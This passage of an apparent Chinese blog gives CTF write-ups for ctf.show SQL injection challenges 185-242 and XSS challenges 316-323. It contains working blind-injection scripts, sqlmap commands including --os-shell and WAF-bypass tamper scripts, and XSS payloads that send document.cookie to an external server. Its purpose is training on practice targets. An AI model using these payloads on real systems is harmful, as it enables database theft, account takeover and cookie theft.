'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n```\n\n**186**\n\n同上，开打就完了\n\n**187**\n\n针对`md5(xxx,true)`的绕过：[链接](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\n只能寻找md5\n\n所以密码输入:ffifdyop即可\n\n进行运算得出的结果为\n\n'or'6�]��!r,��b\n\n由于or后面6为真，所以语句恒为真\n\n**188**\n\nSQL比较真真离谱\n\n字符串当作数字处理\n\n即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。\n\n00即可\n\n**189**\n\n空格消失法，提示flag在api/flag.php中，必然要读取文件咯\n\n尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误\n\n布尔盲注走起\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\n进行一个布尔的盲注\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\n过滤了file|into|ascii上个脚本还能用\n\n**192**\n\n过滤了file|into|ascii|ord|hex继续用\n\n**193**\n\n过滤了file|into|ascii|ord|hex|substr问题不大，换left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\n我谢谢你啊left和right都没了\n\n过滤了file|into|ascii|ord|hex|substr|char|left|right|substring，用like或者正则（其实用mid也行）\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\n堆叠改密码咯，查询语句中的username没有用引号包裹，所以查询的时候用十六进制转字符串\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\n😅\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 11.29.32.png)\n\n**197，198**\n\n一个wp脚本\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"登陆成功\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\n我选离谱方法：\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199，200**\n\n只有离谱方法能用了\n\n**201**\n\nsqlmap使用开始\n\n```\n//查库\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//查表\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//查字段 \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//查值\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\n使用POST请求，添加--data参数来设置\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\n调整请求方式，此处调整为PUT请求，记得加上Content-Type不然会变表单提交\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\n加上cookie，用--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php --cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**205**\n\n提示api鉴权，发现请求前会先对一个url进行调用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 21.53.17.png)\n\n使用如下两个参数\n\n```\n--safe-url 设置在测试目标地址前访问的安全链接\n--safe-freq 设置两次注入测试前访问安全链接的次数\n```\n\n最终命令~~悄悄换表名和列名真的可恶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\n提示SQL需要闭合，~~当我sqlmap傻是吧~~，同上即可\n\n**207**\n\n--tamper 的初体验\n\n[tamper总结](https://blog.csdn.net/whatday/article/details/54774043)\n\n使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击，--tamper=TAMPER 利用给定的脚本进行篡改注入数据，该题过滤了空格，使用自带的space2comment.py即可绕过\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\n过滤了小写的select，但是sqlmap中所有SELECT都是大写，同上即可\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\n过滤了空格，*和=，讲道理使用bluecoat.py就行，但是出不来，只能自己编写脚本替换了，将空格用%09替换，=用LIKE替换\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\n对字符串进行base64解码反转再解码，那就编码反转再编码\n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\n相比于上题多过滤了空格，加上space2commit脚本即可\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\n前两个加起来\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\n一键getshell，--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\n时间盲注开始\n\n首页发现网络流量中有select.js，查看代码\n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\n发现提交的表单中有两个变量，测试一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 14.27.34.png)\n\n测试成功，开始编写代码\n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\n单引号闭合\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64编码\n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleep不能用了啦，都ctfshow害得啦，拜托，换benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmark也🈚️了，换笛卡尔积\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\n过滤了rlike，笛卡尔积依然可用，同上即可\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\n真能滤，换left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\n时间盲注，结束\n\n**221**\n\nlimit注入，欢迎收看P神博客\n\n报错注入\n\n```\nSELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \n```\n\n**222**\n\nGroup_by后面的参数来进行布尔注入\n\n```python\nimport requests\nurl=\"http://debba94a-3e3c-4b9e-97e0-27c6e7381dde.challenge.ctf.show/api/?u=\"\nca=\"ctfshow{1234567890-abcdef}\"\nfor i in range(1,100):\n    for j in ca:\n        payload=f'if(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1)=\"{j}\",\"username\",cot(0))'\n        tex=requests.get(url+payload).text\n        if \"username\" in tex:\n            print(j,end=\"\")\n            break;\n```\n\n**223**\n\n过滤了数字，贴个大佬脚本\n\n```python\n# @Author:Kradress\nimport requests\nimport string\n\nurl = \"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/\"\n\nresult = ''\ndict=string.ascii_lowercase+string.digits+\"_-,}{\"\n\n# 爆表名  \n# payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"\n# 爆列名\n# payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'\"\n#爆字段值\npayload = \"select flagasabc from ctfshow_flagas\"\n\ndef numToStr(str):\n    parts = []\n    for s in str:\n        parts.append(numToStr2(s))\n    res = ','.join(parts)\n    return f\"concat({res})\"\n\ndef numToStr2(num):\n    parts = []\n    n = ord(num)\n    for i in range(n):\n        parts.append(\"true\")\n    res = \"+\".join(parts)\n    return f\"char({res})\"\n\nfor i in range(1,46):\n    print(i)\n    for j in dict:\n        params={\n            'u' : f\"concat(if(substr(({payload}),{numToStr(str(i))},true)={numToStr(j)},username,cot(false)))#\"\n        }\n        r = requests.get(url, params=params)\n        # print(r.url)\n        if(\"ctfshow\" in r.text):\n            result +=j\n            print(result)\n            break\n```\n\n**224**\n\n通过文件信息的注入，这里有颖师傅的[博客](https://blog.gem-love.com/ctf/2283.html)\n\n> 但是发现这个`file()`方法可以检测图片的EXIF信息，而EXIF信息中有一个comment字段，相当于图片注释，而`finfo->file()`正好能够输出这个信息，如果上面的假设成立，这就可以造成SQL注入\n>\n\n再到别的师傅那里去拿一个源码\n\n```php\n<?php\n\terror_reporting(0);\n\tif ($_FILES[\"file\"][\"error\"] > 0)\n\t{\n\t\tdie(\"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br />\");\n\t}\n\tif($_FILES[\"file\"][\"size\"]>10*1024){\n\t\tdie(\"文件过大: \" .($_FILES[\"file\"][\"size\"] / 1024) . \" Kb<br />\");\n\t}\n    if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))\n      {\n      echo $_FILES[\"file\"][\"name\"] . \" already exists. \";\n      }\n    else\n      {\n\t  $filename = md5(md5(rand(1,10000))).\".zip\";\n      $filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n      if(preg_match(\"/image|png|bmap|jpg|jpeg|application|text|audio|video/i\",$filetype)){\n        die(\"file type error\");\n      }\n\t  $filepath = \"upload/\".$filename;\n\t  $sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\".$filename.\"','\".$filepath.\"','\".$filetype.\"');\";\n      move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\n      \"upload/\" . $filename);\n\t  $con = mysqli_connect(\"localhost\",\"root\",\"root\",\"ctf\");\n\t\tif (!$con)\n\t\t{\n\t\t\tdie('Could not connect: ' . mysqli_error());\n\t\t}\n\t\tif (mysqli_multi_query($con, $sql)) {\n\t\t\theader(\"location:filelist.php\");\n\t\t} else {\n\t\t\techo \"Error: \" . $sql . \"<br>\" . mysqli_error($con);\n\t\t}\n\t\t \n\t\tmysqli_close($con);\n\t\t\n      }\n    \n?>\n```\n\n看到filetype变量确实通过finfo取了内容，我们本地跑一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302009630.png)\n\n确实输出了部分的文件信息，看群里给的payload，使用的是bin文件，构造的文件部分内容被输出\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302053318.png)\n\n上传拿shell即可\n\n后记：似乎这里拿到的是file命令获取的内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302055956.png)\n\n**225**\n\n堆叠：\n\n```\nprepare a from 0x十六进制语句;execute a;\n```\n\n**226**\n\n同上\n\n**227**\n\n没查出来东西，看WP，通过查询`information_schema.routines`查看存储过程和函数\n\n> 存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。\n> 存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。\n> 存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。\n\n就是存了已经定义好的函数，可以看到getFlag函数，也能看到flag，调用的话使用call getFlag就好\n\n**228,229,230**\n\n都是上面的\n\n**231**\n\nupdate开始，第一道题直接连着username一起改\n\n```\npassword=0',username=(select group_concat(flagas) from flaga where table_schema=database())%23&username=1\n```\n\n**232**\n\nmd5问题不大，多裹个括号就行\n\n```\npassword=0'),username=(select group_concat(flagass) from flagaa)%23&username=1\n```\n\n**233**\n\n似乎单引号消失了，转义然后和后面username的闭合就行\n\n```\npassword=\\&username=,username=(select group_concat(flagass233) from flag233333)%23\n```\n\n**234**\n\n单双一起，同上\n\n```\npassword=\\&username=,username=(select group_concat(flagass23s3) from flag23a)%23\n```\n\n**235**\n\n无列名注入，看[这里](https://blog.csdn.net/qq_31620591/article/details/117067799)\n\n```\npassword=\\&username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flag23a1) as a)%23\n```\n\n**236**\n\n多滤了个flag，没卵用\n\n```\npassword=\\&username=,username=(select group_concat(`2`)  from (select 1,2,3 union select * from flaga) as a)%23\n```\n\n**237**\n\n进入insert环节，闭合，拿数据，插入\n\n```\nusername=1',(select group_concat(flagass23s3) from flag))%23&password=1\n```\n\n**238**\n\n没有空格用括号\n\n```\nusername=1',(select(group_concat(flag))from(flagb)))%23&password=1\n```\n\n**239**\n\n又一个无列名，注不进去，也不知道哪里出问题了\n\n**240**\n\n有表名那不狠狠的爆破？\n\n```python\nimport requests\nimport itertools\nimport time\nurl=\"http://6be0cd82-3931-4919-a3e1-bfdcd72e685a.challenge.ctf.show/api/insert.php\"\ns='ab'\na=map(''.join, itertools.product('ab', repeat=5))\nfor i in a:\n    table='flag'+i;\n    data={'username':f\"1',(select(flag)from({table})))#\",'password':'1'}\n    requests.post(url,data=data)\n    time.sleep(0.1)\n```\n\n**241**\n\n开始删东西了，就20条，用时间盲注吧，脚本from yu师傅\n\n```python\n# @Author:yu22x\nimport requests\nimport time\nimport urllib.parse\nurl = \"http://b37e7121-22c6-4917-bfa5-ddc38a0ed78f.challenge.ctf.show/api/delete.php\"\ns='0123456789abcdef-'\nflag='ctfshow{'\n\nfor i in range(9,46):\n\t\tprint(i)\n\t\tfor j in s:\n\t\t\tdata={'id':f'0||if(substr((select flag from flag),{i},1)=\"{j}\",sleep(1),0)'}\n\t\t\t#print(data)\n\t\t\ttry:\n\t\t\t\trequests.post(url,data=data,timeout=1)\n\t\t\texcept:\n\t\t\t\tflag+=j  \n\t\t\t\tprint(flag)\n\t\t\t\tbreak\n\t\t\ttime.sleep(1)\n```\n\n**242**\n\n进行一个文件的dump\n\n\n\n"},{"title":"CTFshowXSS","url":"/posts/36544.html","content":"\n首先自己搭建或者找[xss测试平台](https://xss8.cc/login/)还有[另一个](https://xss.pt/)\n\n**316**\n\n```\n最简单的：\n<script>document.location.href='http://服务器IP/?x='document.cookie</script>\n```\n\n**317**\n\n过滤了script\n\n```\n<body onload=\"document.location.href='http://服务器IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\n过滤了img，使用iframe\n\n```\n<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n<BODY\tONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>\n```\n\n**319**\n\n同上即可\n\n**320**\n\n过滤了空格，script，用tab\n\n```\n<iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n```\n\n**321**\n\n过滤了img，同上\n\n**322**\n\n同上\n\n**323**\n\n过滤了iframe，使用body 